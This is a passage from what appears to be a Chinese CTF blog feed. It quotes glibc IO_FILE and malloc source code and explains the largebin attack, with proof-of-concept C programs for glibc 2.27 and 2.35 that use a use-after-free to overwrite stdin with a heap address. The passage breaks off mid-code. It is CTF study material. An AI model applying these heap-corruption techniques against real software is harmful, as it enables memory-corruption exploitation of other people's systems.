<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);</span><br><span class="line">	  to_do -= count;</span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end; </span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>























<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.anquanke.com/post/id/177958">https://www.anquanke.com/post/id/177958</a></p>
<p><a href="https://www.anquanke.com/post/id/177910">https://www.anquanke.com/post/id/177910</a></p>
<p><a href="https://tttang.com/archive/1279/#toc_0x00">https://tttang.com/archive/1279/#toc_0x00</a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>POC for LagerbinAttach</title>
    <url>/2024/08/19/LargerbinAttach/</url>
    <content><![CDATA[<h1 id="关于largebin"><a href="#关于largebin" class="headerlink" title="关于largebin"></a>关于largebin</h1><p><img src="/../../themes/butterfly/source/img/mypic/poc/largebin.png" alt="largebin"></p>
<p>图片来源：[<a href="https://bbs.kanxue.com/thread-262424.htm#msg_header_h2_3">原创]Largebin attack总结-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
<h1 id="任意地址写入堆地址"><a href="#任意地址写入堆地址" class="headerlink" title="任意地址写入堆地址"></a>任意地址写入堆地址</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>需要存在uaf漏洞，也就是可以修改largebin的bcksize字段</span><br><span class="line"><span class="number">2.</span>需要申请足够多的堆块（用于隔离和清空unsortedbin）</span><br></pre></td></tr></table></figure>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
<p>主要是largechunk入链的时候的漏洞,若unsortedbin中没有合适堆块，则会将unsortedbin中的堆块放到smallbin和lagerbin中。完整代码：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = smallbin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = largebin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">             <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                 size |= PREV_INUSE;</span><br><span class="line">                 <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                 assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">	      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;</span><br><span class="line">                     bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">                     <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                       &#123;</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">		  assert (chunk_main_arena (fwd));</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">		  == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;</span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                       &#123;</span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                         <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                           malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                       &#125;</span><br><span class="line">                     bck = fwd-&gt;bk;</span><br><span class="line">                     <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                       malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">         mark_bin (av, victim_index);</span><br><span class="line">         victim-&gt;bk = bck;</span><br><span class="line">         victim-&gt;fd = fwd;</span><br><span class="line">         fwd-&gt;bk = victim;</span><br><span class="line">         bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>利用点：主要集中在这几行上面，如果可以覆盖fwd的bcksize字段，那么就可以将bcksize的+0x20处的值覆盖为victim的地址，实现任意地址写堆地址的目的，可以结合iofile构造io链使用，但是在高版本的情形下已经打上了补丁<code>malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</code>检查了size双向链表的完整性，使此利用方法成为历史。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>但是下述代码没有检查，或许成为突破口。条件为，堆块在同一个bin中最小，且可以控制第一个堆块的bcksize字段，那么也可以形成上述攻击。。。。但是有可能我想错了。。。。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">	      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;</span><br><span class="line">                     bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure>

<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><blockquote>
<p>测试攻击有效性的demo，</p>
<p>GLIBC2.7,不知道低版本的编译器有什么bug，编译连接之后printf有的指令需要栈对齐才能用，但是编译器没有考虑，所以就把printf注释掉了，Glibc2.23可正常使用，就不再写一遍了。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc-7 -c largebin-attach.c -o lar2.7.o</span></span><br><span class="line"><span class="comment">ld --dynamic-linker=/home/l/how2heap/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/ld-2.27.so    --rpath=/home/l/how2heap/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64    lar2.7.o -o lar2.7 -lc</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">void</span> *la = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="type">void</span> *junk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">void</span> *lb = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="comment">/*保护chunk，防止释放与top合并*/</span></span><br><span class="line">    <span class="type">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*进入unsorted bin */</span></span><br><span class="line">    <span class="built_in">free</span>(la);</span><br><span class="line">    <span class="comment">/*此时unsortedbin中chunk会被放到largerbin[64]中 */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x800</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    此时的largerbin[64]的简略布局：</span></span><br><span class="line"><span class="comment">    lb-&gt;la</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//printf(&quot;%p\n&quot;,la);</span></span><br><span class="line">    <span class="type">long</span> *value = (<span class="type">long</span> *)(*((<span class="type">long</span>*)la+<span class="number">3</span>));</span><br><span class="line">    <span class="comment">//printf(&quot;la-&gt;bcksize = %p\n&quot;,value);</span></span><br><span class="line">    <span class="comment">/*覆盖la-&gt;bcksize */</span></span><br><span class="line">    <span class="type">long</span> *tmp = (<span class="type">long</span>*)la+<span class="number">3</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;_IO_2_1_stdin_ address = %p\n&quot;,stdin);</span></span><br><span class="line">    *tmp = (<span class="type">long</span> *)&amp;<span class="built_in">stdin</span><span class="number">-4</span>;</span><br><span class="line">    <span class="comment">/*attach start*/</span></span><br><span class="line">    <span class="built_in">free</span>(lb);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x800</span>);</span><br><span class="line">    <span class="comment">//printf(&quot;fake _IO_2_1_stdin_ address = %p\n&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>GLIBC2.35,没想到这种版本居然也可以利用,只需要保证释放的堆块是最小的即可（交换la和lb的顺序），源码中已经分析过了没有检查，不知道再高的版本修复了没有。。。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">void</span> *la = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="type">void</span> *junk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">void</span> *lb = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="comment">/*保护chunk，防止释放与top合并*/</span></span><br><span class="line">    <span class="type">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*进入unsorted bin */</span></span><br><span class="line">    <span class="built_in">free</span>(la);</span><br><span class="line">    <span class="comment">/*此时unsortedbin中chunk会被放到largerbin[64]中 */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x800</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    此时的largerbin[64]的简略布局：</span></span><br><span class="line"><span class="comment">    lb-&gt;la</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,la);</span><br><span class="line">    <span class="type">long</span> *value = (<span class="type">long</span> *)(*((<span class="type">long</span>*)la+<span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;la-&gt;bcksize = %p\n&quot;</span>,value);</span><br><span class="line">    <span class="comment">/*覆盖la-&gt;bcksize */</span></span><br><span class="line">    <span class="type">long</span> *tmp = (<span class="type">long</span>*)la+<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_2_1_stdin_ address = %p\n&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    *tmp = (<span class="type">long</span> *)&amp;<span class="built_in">stdin</span><span class="number">-4</span>;</span><br><span class="line">    <span class="comment">/*attach start*/</span></span><br><span class="line">    <span class="built_in">free</span>(lb);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x800</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake _IO_2_1_stdin_ address = %p\n&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    <span 